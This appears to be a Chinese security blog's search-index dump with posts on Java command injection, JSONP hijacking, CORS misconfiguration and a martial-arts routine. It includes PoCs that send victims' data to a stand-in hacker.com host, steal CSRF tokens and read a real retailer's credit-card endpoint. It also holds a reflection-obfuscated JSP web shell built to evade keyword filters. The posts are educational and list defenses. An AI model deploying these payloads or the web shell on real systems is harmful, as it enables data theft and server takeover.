","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:7:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常用方法 Java中可以执行系统命令的函数有： 1.Runtime.getRuntime.exec() Runtime runtime = Runtime.getRuntime(); Process process = runtime.exec(command); exec的使用方式有以下六种： // 在单独的进程中执行指定的字符串命令 public Process exec(String command) // 在单独的进程中执行指定的命令和参数 public Process exec(String[] cmdarray) // 在具有指定环境的单独进程中执行指定的命令和参数 public Process exec(String[] cmdarray, String[] envp) // 在具有指定环境和工作目录的单独进程中执行指定的命令和参数 public Process exec(String[] cmdarray, String[] envp, File dir) // 在具有指定环境的单独进程中执行指定的字符串命令 public Process exec(String command, String[] envp) // 在具有指定环境和工作目录的单独进程中执行指定的字符串命令 public Process exec(String command, String[] envp, File dir) exec在执行系统命令时，当传入的参数为字符串参数和数组参数时，有不同的返回结果： 首先利用exec()方法执行字符串命令，如：Process proc = Rumtime.getRuntime.exec(\"ping 127.0.0.1\");执行成功。 利用exec()方法执行多个命令或命令中存在\u003e或|等特殊字符时：Process proc = Rumtime.getRuntime.exec(\"ping 127.0.0.1ls\");执行失败。 然后当传入的命令改为数组参数时，发现ping和id两个命令可以正常执行： String [] cmd = {\"/bin/bash\", \"-c\", \"ping -t 3 127.0.0.1;id\"}; Process proc = Runtime.getRuntime().exec(cmd); 原因分析： 当跟进exec函数，发现调用的是: public Process exec(String cmdarray[]) throws IOException { return exec(cmdarray, null, null); } 跟入exec方法，发现调用的是这种参数的方法： public Process exec(String[] cmdarray, String[] envp, File dir) 那么为什么传入字符串和传入数组会造成不同的结果呢？ 可以看到如下对字符串类型参数进行处理的代码： StringTokenizer对传入的字符串命令参数进行处理，然后再调用 exec(String[] cmdarray, String[] envp, File dir) 关键点就在于StringTokenizer如何进行处理的，跟进去发现： 会用空格和换行符tab符等空白符\\t\\n\\r\\f对传入的字符串进行分割，返回一个cmdarray数组，其中cmdarray的第一个要素为执行的命令，该处理导致了再调用exec方法执行命令时，传入字符串参数和数组参数时的返回结果不同。 例如当传入参数分别如下： // exec执行字符串参数 String cmd1 = \"/bin/bash -c \\\"ping -t 3 127.0.0.1;id\\\"; // exec执行字数组参数 String cmd1 = {\"/bin/bash\", \"-c\", \"ping -t 3 127.0.0.1;id\"}; 当执行字符串参数时，经过StringTokenizer类后拆分为： {\"/bin/bash\", \"-c\", \"ping\", \"-t\", \"3\", \"127.0.0.1;id\", \"\"\"}; 这就改变了原有的执行命令的语义，导致命令不能正常执行； 而当执行数组参数值，发现没有进入StringTokenizer类。 如果exec方法执行的参数是字符串参数，参数中的空格就会经过StringTokenizer处理，处理完成后会改变原有的语义导致命令无法正常执行，要想执行命令必须绕过StringTokenizer，即找到代替空格的字符就可以，这里比如：${IFS}, $IFS$9等。 但是url中因为RFC规范，只允许包含数字、字母和四个特殊字符-_.~，不允许出现前面的{}，所以对{}进行url编码即可。 Java中，连接符的使用存在一定局限。例如： ... Process process = Runtime.getRuntime().exec(\"ping\" + url); ... 以上代码中使用ping来诊断网络。当黑客输出www.baidu.com\u0026ipconfig时，拼接处的系统命令为www.baidu.com\u0026ipconfig，该命令在命令行终端可以执行。但是在Java运行环境下却执行失败。在Java中，www.baidu.com\u0026ipconfig被当做一个完整字符串而非两条命令，因为该示例代码并不存在命令执行漏洞。 2.ProcessBuilder.start() ProcessBuilder pb = new ProcessBuilder(\"命令\", \"参数\"); Process process = pb.start() ProcessBuilder.start()执行系统命令时，并没有获得Unix或Linux Shell。因此要使用Unix/Linux管道之类的功能，必须先调用一个shell程序，比如：想要通过Java执行ls;id这个命令，必须先调用shell程序/bin/sh才能执行，即：/bin/sh -c \"ls;id\" ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:7:1","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"修复 开发人员应将现有API用于其语言。如不用Runtime.exec()发出mail的命令，而使用位于java.mail的可用api 如果不存在这种api，应进行查找和过滤恶意字符 对PHP语言来说，不能完全控制的危险函数最好不要使用 ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:8:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简介 JSONP全称是JSON with Padding ，是基于JSON格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了HTML里script元素标签没有跨域限制 **JSONP原理：**就是动态插入带有跨域url的script标签，然后调用回调函数，把我们需要的json数据作为参数传入，通过一些逻辑把数据显示在页面上。 比如通过script访问http://www.test.com/index.html?jsonpcallback=callback, 执行完script后，会调用callback函数，参数就是获取到的数据。 原理简介的例子：新建callback.php \u003c?php header('Content-type: application/json'); $callback = $_GET[\"callback\"]; //json数据 $json_data = '{\"user\":\"user1111\",\"password\":\"12345678\"}'; //输出jsonp格式的数据 echo $callback . \"(\" . $json_data . \")\"; ?\u003e 新建test.html \u003c!-- test.html --\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cscript type=\"text/javascript\"\u003e function fun(obj){ alert(obj[\"password\"]); } \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript type=\"text/javascript\" src=\"http://localhost/callback.php?callback=fun\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 访问test.html，页面会执行script，请求http://127.0.0.1/callback.php?callback=fun，然后将请求的内容作为参数，执行fun函数，fun函数将请求的内容alert出来。这样我们就实现了通过js操作跨域请求到的资源，绕过了同源策略。 ","date":"2022-01-12","objectID":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/:1:0","tags":["jsonp","跨域"],"title":"jsonp介绍及其安全风险","uri":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"categories":["渗透测试"],"content":"JSONP劫持 JSONP劫持类似于CSRF漏洞 JSONP使用不当也会造成很多安全问题。 对于JSONP传输数据，正常的业务是用户在B域名下请求A域名下的数据，然后进行进一步操作。 但是对A域名的请求一般都需要身份验证，Hacker可以自己构造一个页面，诱惑用户去点击（在这个页面里，我们去请求A域名资源，然后回调函数将请求到的资源发回到hacker服务器上），以此来获取这些信息。 POC如：test.html \u003chtml\u003e \u003chead\u003e \u003ctitle\u003etest\u003c/title\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cscript type=\"text/javascript\"\u003e function fun(obj){ var myForm = document.createElement(\"form\"); myForm.action=\"http://hacker.com/redirect.php\"; myForm.method = \"GET\"; for ( var k in obj) { var myInput = document.createElement(\"input\"); myInput.setAttribute(\"name\", k); myInput.setAttribute(\"value\", obj[k]); myForm.appendChild(myInput); } document.body.appendChild(myForm); myForm.submit(); document.body.removeChild(myForm); } \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript type=\"text/javascript\" src=\"http://localhost/callback.php?callback=fun\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 诱导用户去访问此html，会以用户的身份访问http://localhost/callback.php?callback=fun,拿到敏感数据，然后执行fun函数，将数据发送给http://hacker.com/redirect.php。 然后hacker只需要在redirect.php里，将数据保存下来，然后重定向到baidu.com，堪称一次完美的JSONP劫持。 ","date":"2022-01-12","objectID":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/:2:0","tags":["jsonp","跨域"],"title":"jsonp介绍及其安全风险","uri":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"categories":["渗透测试"],"content":"利用JSONP绕过token防护进行csrf攻击 场景假设：服务端判断接收到的请求包，如果含有callback参数就返回JSONP格式的数据，否则返回正常页面。代码如下：test.php \u003c!-- callback.php --\u003e \u003c?php header('Content-type: application/json'); //json数据 $json_data = '{\"customername1\":\"user1\",\"password\":\"12345678\"}'; if(isset($_GET[\"callback\"])){ $callback = $_GET[\"callback\"]; //如果含有callback参数，输出jsonp格式的数据 echo $callback . \"(\" . $json_data . \")\"; }else{ echo $json_data; } ?\u003e 对于场景，如果存在JSONP劫持劫持，我们就可以获取到页面中的内容，提取出csrf_token，然后提交表单，造成csrf漏洞。示例利用代码如下： \u003chtml\u003e \u003chead\u003e \u003ctitle\u003etest\u003c/title\u003e \u003cmeta charset=\"utf-8\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"test\"\u003e\u003c/div\u003e \u003cscript type=\"text/javascript\"\u003e function test(obj){ // 获取对象中的属性值 var content = obj['html'] // 正则匹配出参数值 var token=content.match('token = \"(.*?)\"')[1]; // 添加表单节点 var parent=document.getElementById(\"test\"); var child=document.createElement(\"form\"); child.method=\"POST\"; child.action=\"http://vuln.com/del.html\"; child.id=\"test1\" parent.appendChild(child); var parent_1=document.getElementById(\"test1\"); var child_1=document.createElement(\"input\"); child_1.type=\"hidden\";child_1.name=\"token\";child_1.value=token; var child_2=document.createElement(\"input\"); child_2.type=\"submit\"; parent_1.appendChild(child_1); parent_1.appendChild(child_2); } \u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"http://vuln.com/caozuo.html?htmlcallback=test\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e htmlcallback返回一个对象obj，以该对象作为参数传入test函数，操作对象中属性名为html的值，正则匹配出token，再加入表单，自动提交表单完成操作，用户点击该攻击页面即收到csrf攻击。 ","date":"2022-01-12","objectID":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/:3:0","tags":["jsonp","跨域"],"title":"jsonp介绍及其安全风险","uri":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"categories":["渗透测试"],"content":"JSONP劫持挖掘 首先需要尽可能的找到所有的接口，尤其是返回数据格式是JSONP的接口。(可以在数据包中检索关键词callback json jsonp email等，也可以加上callback参数，观察返回值是否变化)。 找到接口之后，还需要返回值包含敏感信息，并且能被不同的域的页面去请求获取(也就是是否存在refer限制,实际上，如果接口存在refer的限制，也是有可能被绕过的) ","date":"2022-01-12","objectID":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/:4:0","tags":["jsonp","跨域"],"title":"jsonp介绍及其安全风险","uri":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"categories":["渗透测试"],"content":"防御 限制来源refer 按照JSON格式标准输出（设置Content-Type : application/json; charset=utf-8），预防http://127.0.0.1/getUsers.php?callback=\u003cscript\u003ealert(/xss/)\u003c/script\u003e形式的xss 过滤callback函数名以及JSON数据输出，预防xss ","date":"2022-01-12","objectID":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/:5:0","tags":["jsonp","跨域"],"title":"jsonp介绍及其安全风险","uri":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"categories":["渗透测试"],"content":"参考文章 jsonp介绍及其安全风险 - SAUCERMAN (saucer-man.com) 还是这位大佬写得好，小弟基本全是看的他的 [JSONP 劫持原理与挖掘方法 | K0rz3n’s Blog](https://www.k0rz3n.com/2019/03/07/JSONP 劫持原理与挖掘方法/) JSONP绕过CSRF防护token - 先知社区 (aliyun.com) 分享一个jsonp劫持造成的新浪某社区CSRF蠕虫 | 离别歌 (leavesongs.com) JSONP 安全攻防技术 - 知道创宇 (knownsec.com) ","date":"2022-01-12","objectID":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/:6:0","tags":["jsonp","跨域"],"title":"jsonp介绍及其安全风险","uri":"/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"categories":["渗透测试"],"content":"简介 CORS全称Cross-Origin Resource Sharing, 跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，不同于古老的jsonp只能get请求，被发明出来就是为了干掉JSONP的，因为用的多，其安全问题也更加普遍。 解决了跨域情况下资源的请求与传输。 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:1:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"CORS实现原理 有个常见的关于同源策略的误区需要指出一下，同源策略并不限制请求的发起和响应，只是浏览器拒绝了js对响应资源的操作 CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： 其中比较重要的相应头为： Access-Control-Allow-Origin: http://a.com 表示服务端接受来自http://a.com的跨域请求 Access-Control-Allow-Credentials: true 表示是否允许发送Cookie，true即发送cookie ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"CORS常见安全问题 实际中我们可能会遇到各种场景，所以CORS也很容易出现配置上的安全问题，大概有如下几种： ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"1 反射Origin头 当管理员想允许多个域名跨域请求时，以下写法都是不允许的 Access-Control-Allow-Origin: http://a.com, http://c.com #或者 Access-Control-Allow-Origin: http://*.a.com 因为CORS标准规定，Access-Control-Allow-Origin只能配置为单个origin, null或*。 有些开发者为了方便，直接使用请求者的origin作为Access-Control-Allow-Origin的域名，例如下面的Nginx配置: add_header \"Access-Control-Allow-Origin\" $http_origin; add_header \"Access-Control-Allow-Credentials\" \"true\"; # 这种配置非常危险，相当于任意网站可以直接跨域读取其资源内容。 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:1","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"2 Origin 校验错误 前面那种反射Origin的做法过于暴力，一般不可取，常用做法是通过自定义规则来校验Origin头，但是在校验过程中也会出现错误。这些错误可以分为四类： 前缀匹配：例如想要允许example.com访问，但是只做了前缀匹配，导致同时信任了example.com.attack.com的访问。 后缀匹配：例如想要允许example.com访问，由于后缀匹配出错，导致允许attackexample.com访问。 没有转义.：例如想要允许www.example.com访问，但正则匹配没有转义.，导致允许wwwaexample.com访问。 包含匹配：例如想要允许example.com，但是Origin校验出错，出现允许ample.com访问。 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:2","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"3 信任null 当配置信任名单为null，可以用来和本地file页面共享数据，如下所示： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 但是攻击者也可以构造Origin为null的跨域请求，比如通过iframe sandbox： \u003ciframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src='data:text/html,\u003cscript\u003e var xhr=new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { alert(xhr.responseText); } } xhr.open(\"GET\", \"http://www.a.com/a.php\", true); xhr.withCredentials = true; xhr.send();\u003c/script\u003e'\u003e \u003c/iframe\u003e ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:3","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"4 HTTPS域信任HTTP域 但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容. ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:4","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"5 信任自身全部子域 很多网站为了方便会将CORS配置为信任全部自身子域，这种配置会扩大子域 XSS的危害。 比如某子站存在xss时，可以通过此xss发送跨域请求，从而获取敏感内容。 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:5","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"6 Origin:*与 Credentials:true 共用 Access-Control-Allow-Origin:*用于表示允许任意域访问，这种配置只能用于共享公开资源。 所以下面这种配置是错误的，浏览器不允许这两种配置同时出现。(对于共享公开资源，不应该需要身份认证) Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:6","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"7 缺少Vary: Origin头 如果一个资源享有多个域名，它需要对不同域名的请求包生成不同的Access-Control-Allow-Origin头。如果一个请求的响应被缓存，且返回中没有Vary: Origin字段，可能会导致其它域名的请求失效。 比如c.com同时允许a.com和b.com共享。c.com资源内容首先被a.com脚本跨域访问后被缓存，其中缓存响应头为Access-Control-Allow-Origin:http://a.com这时，b.com脚本则不能读取缓存响应内容，因为缓存响应头是允许a.com共享，而不是b.com。 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:7","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"检测方式 F1.curl访问网站　curl http://www.xpshuai.cn -H \"Origin: https://test.com\" -I 检查返回包的 Access-Control-Allow-Origin 字段是否为https://test.com F2.burpsuite发送请求包，查看返回包 F3.也可以用开源工具：https://github.com/chenjj/CORScanner F4.对于网站漏洞的挖掘可以使用burp，先勾选上proxy –\u003e options –\u003e Origin –\u003e match and replace里面的Add spoofed CORS origin。 然后在网站观察功能点，最后在HTTP history来筛选带有CORS头部的值，然后用以上工具查看是否有配置缺陷。 检测到CORS配置错误以后，以下有一份poc可用来写报告（感谢大佬）： \u003cscript\u003e //以受害者身份，发送一个跨域请求给目标url var req = new XMLHttpRequest(); req.open('GET',\"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card\",true); req.onload = stealData; req.withCredentials = true; req.send(); function stealData(){ //由于目标站点的CORS配置错误，我们可以读取到相应包 var data= JSON.stringify(JSON.parse(this.responseText),null,2); //展示相应包到这个页面上，作为hacker还可以将内容发送到自己的服务器 output(data); } function output(inp) { document.body.appendChild(document.createElement('pre')).innerHTML = inp; } \u003c/script\u003e ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"危害 1.同于csrf跨站请求伪造，发送钓鱼链接，读取用户敏感数据。 ​ 还可以获取cookie，针对http-only js代码无法读取的情况 2.结合xss漏洞利用cors漏洞，针对http_only js代码无法读取 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:5:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"漏洞防范 不要盲目反射Origin头 严格校验Origin头，避免出现权限泄露 不要配置Access-Control-Allow-Origin: null HTTPS网站不要信任HTTP域 不要信任全部自身子域，减少攻击面 不要配置Origin:*和Credentials: true 增加Vary: Origin头 ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:6:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"参考文章 CORS介绍及其漏洞检测 - SAUCERMAN (saucer-man.com) ","date":"2022-01-12","objectID":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:7:0","tags":["CORS漏洞","跨域"],"title":"CORS漏洞检测和利用方式","uri":"/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["武术"],"content":"简介 初级刀术是原国家体委为了在全国普及武术，于20世纪60年代初期向全国推广，于1976年正式合订出版的武术初级套路(初级长拳、刀、剑、棍、枪)之一。初级刀术除起势与收势外，全套共32个动作。全套分为4段，每段8个动作。从起势至收势往返2个来回。它的技法包括扎、斩、撩、挂、劈、扫、挑、砍、按、带和缠头、裹脑等主要刀法和各种步法、身法、眼法等。 初级刀术便于自学，既可单人练习，亦可集体演练。它是属于长拳类的刀术。它的演练风格是快速勇猛，与少林刀的风格基本相同。从难易程度上讲，它是初学者的套路，是武术爱好者的基础套路，是大、中、小学生喜闻乐见的套路。武术初级套路被列为中、小学体育教材之一，列为大学体育选修教材之一，是大、中、小学校学生武术队的训练项目之一。可以说它是中华人民共和国建国以来，全国最普及、参与人数最多的刀术项目。 ","date":"2022-01-12","objectID":"/%E5%88%9D%E7%BA%A7%E5%88%80%E6%9C%AF/:1:0","tags":["初级刀"],"title":"初级刀","uri":"/%E5%88%9D%E7%BA%A7%E5%88%80%E6%9C%AF/"},{"categories":["武术"],"content":"动作名称 预备姿势 起势 第一组动作 第二组动作 第一段 1·弓步缠头 2·虚步藏刀 3·弓步前刺 4·并步上挑 5·左抡劈 6·右抡劈 7·弓步撩刀 8·弓步藏刀 第二段 9·提膝缠头 10·弓步平斩 11·仆步带刀 12·歇步下砍 13·左劈刀 14·右劈刀 15·歇步按刀 16·马步平劈 第三段 17·弓步撩刀18·插步反撩 19，转身挂劈20·仆步下砍 21·架刀前刺22·左斜劈刀 23·右斜劈刀24·虚步藏刀 第四段 25·旋转扫刀26·翻身劈刀 27·缠头箭踢28·仆步按刀 29·缠头蹬腿30·虚步藏刀 31·弓步缠头32·并步抱刀 收势 ","date":"2022-01-12","objectID":"/%E5%88%9D%E7%BA%A7%E5%88%80%E6%9C%AF/:2:0","tags":["初级刀"],"title":"初级刀","uri":"/%E5%88%9D%E7%BA%A7%E5%88%80%E6%9C%AF/"},{"categories":["武术"],"content":"视频 初级刀术教学 （完整背面示范教学片）_哔哩哔哩_bilibili ","date":"2022-01-12","objectID":"/%E5%88%9D%E7%BA%A7%E5%88%80%E6%9C%AF/:3:0","tags":["初级刀"],"title":"初级刀","uri":"/%E5%88%9D%E7%BA%A7%E5%88%80%E6%9C%AF/"},{"categories":["JAVA安全"],"content":"搭建环境 新建maven项目 + tomcat pom.xml引入servlet \u003cdependency\u003e \u003cgroupId\u003ejavax.servlet\u003c/groupId\u003e \u003cartifactId\u003ejavax.servlet-api\u003c/artifactId\u003e \u003cversion\u003e4.0.1\u003c/version\u003e \u003c/dependency\u003e ","date":"2022-01-12","objectID":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/:1:0","tags":["Java反射"],"title":"Java反射机制实现无关键字执行命令","uri":"/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"categories":["JAVA安全"],"content":"代码 cmd.jsp \u003c%@ page import=\"java.lang.reflect.Method\" %\u003e \u003c%@ page import=\"java.util.Scanner\" %\u003e \u003c%@ page import=\"java.io.InputStream\" %\u003e\u003c%-- Created by IntelliJ IDEA. User: 19401 Date: 2022/1/12 Time: 17:13 To change this template use File | Settings | File Templates. --%\u003e \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c% String str = request.getParameter(\"str\"); // 定义\"java.lang.Runtime\"字符串变量 String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}); // 反射java.lang.Runtime类获取Class对象 Class\u003c?\u003e c = null; try { c = Class.forName(rt); // 反射获取Runtime类的getRuntime方法 Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})); // 反射获取Runtime类的exec方法 Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class); // 反射调用Runtime.getRuntime().exec(xxx)方法 Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str}); // 反射获取Process类的getInputStream方法 Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109})); m.setAccessible(true); // 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串 Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter(\"\\\\A\"); String result = s.hasNext() ? s.next() : \"\"; // 输出命令执行结果 out.println(result); } catch (Exception e) { e.printStackTrace(); } %\u003e 能正常执行： 